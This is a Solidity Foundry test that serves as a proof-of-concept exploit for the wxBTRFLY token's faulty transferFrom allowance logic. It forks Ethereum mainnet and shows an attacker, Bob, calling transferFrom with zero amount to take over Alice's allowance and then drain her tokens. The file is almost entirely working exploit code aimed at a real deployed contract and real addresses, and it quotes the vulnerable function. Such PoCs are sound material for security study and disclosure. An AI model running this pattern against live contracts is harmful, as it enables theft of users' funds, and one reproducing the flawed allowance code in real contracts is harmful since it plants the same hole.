// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./Interface.sol";

/*
Redacted Cartel Custom Approval Logic Exploit PoC

The vulnerability would have allowed a malicious attacker to assign a user’s allowance to themselves, enabling the attacker to steal that user’s funds.

a faulty implementation of standard transferFrom() ERC-20 function in wxBTRFLY token.


*/
contract RedactedCartelExploit is DSTest {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    ISafeERC20 wxBTRFLY = ISafeERC20(0x186E55C0BebD2f69348d94C4A27556d93C5Bd36C);

    function setUp() public {
        cheats.createSelectFork("https://rpc.ankr.com/eth", 13908185); //13903280 
    }

    function test() public {
        address Alice = 0x9ee1873ba8383B1D4ac459aBd3c9C006Eaa8800A;
        address AliceContract = 0x0f41d34B301E24E549b7445B3f620178bff331be;
        address Bob = 0x78186702Bd66905845B469E3b76d4FD63F8722d4;
        address owner = 0x20B92862dcb9976E0AA11fAE766343B7317aB349;

        //quick hack to bypass the "onlyAuthorisedOperators" modifier
        cheats.prank(owner);
        wxBTRFLY.unFreezeToken();

        console.log("Before the Exploit !");
        console.log("Alice wxBTRFLY Token Balance: ", wxBTRFLY.balanceOf(Alice));
        console.log("Bob wxBTRFLY Token Balance: ", wxBTRFLY.balanceOf(Bob));
        console.log("--------------------------------------------------");

        // Step 1: Alice approves an address to spend wxBTRFLY on her behalf
        cheats.prank(Alice);
        wxBTRFLY.approve(AliceContract, 9011248549237373700);
        console.log("wxBTRFLY Allowance of Alice->AliceContract : ", wxBTRFLY.allowance(Alice, AliceContract));
        console.log("wxBTRFLY Allowance of Alice->Bob(Before transferFrom): ", wxBTRFLY.allowance(Alice, Bob));


        /*
            Custom vulnerable transferFrom function

             function transferFrom(address sender, address recipient, uint256 amount) public virtual override onlyAuthorisedOperators returns (bool) {
                _transfer(sender, recipient, amount);
                _approve(sender, msg.sender, allowance(sender, recipient ).sub(amount, "ERC20: transfer amount exceeds allowance"));
                return true;
            }
        */

        // Step 2: Bob calls wxBTRFLY.transferFrom(Alice, aliceContract, 0),
        // No transfer happens, but due to the allowance bug, Bob gets an allowance for Alice’s money
        cheats.prank(Bob);
        //_approve(Alice, Bob, allowance(Alice, AliceContract ).sub(0)
        wxBTRFLY.transferFrom(Alice, AliceContract, 0);
        console.log("wxBTRFLY Allowance of Alice->Bob(After transferFrom): ", wxBTRFLY.allowance(Alice, Bob));

        cheats.prank(Bob);
        wxBTRFLY.transferFrom(Alice, Bob, 9011248549237373700);
        
        console.log("--------------------------------------------------");
        console.log("After the Exploit !");
        console.log("Alice wxBTRFLY Token Balance: ", wxBTRFLY.balanceOf(Alice));
        console.log("Bob wxBTRFLY Token Balance: ", wxBTRFLY.balanceOf(Bob));
    }
}